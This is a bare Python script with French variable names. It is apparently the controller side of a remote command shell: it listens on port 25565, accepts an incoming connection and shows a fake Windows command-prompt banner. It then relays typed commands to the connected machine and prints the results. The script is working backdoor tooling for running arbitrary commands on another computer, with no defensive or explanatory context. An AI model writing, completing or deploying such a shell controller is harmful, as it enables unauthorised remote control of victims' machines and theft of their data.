import socket, os
hote = ''
port = 25565
boucle = True
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((hote, port))
socket.listen(1)
print("Attendez..")

client, infos_connexion = socket.accept()
print("Connecté à : ",infos_connexion)
print("\nMicrosoft Windows [Version 10.0.18362.295]\n(c) 2019 Microsoft Corporation. All rights reserved.\n")

while boucle is True:
    whereiam = client.recv(1024)
    whereiam = whereiam.decode()
    commande = input(whereiam+">")

    if commande == "closeserverclient":
        boucle = False
    elif commande == "cls":
        os.system("cls")
    elif commande == "":
        commande = " "
    commande = commande.encode()
    client.send(commande)
    reponse = str( client.recv(9999).decode("utf-8", errors="ignore"))
    print(reponse)
        

client.close()
socket.close()
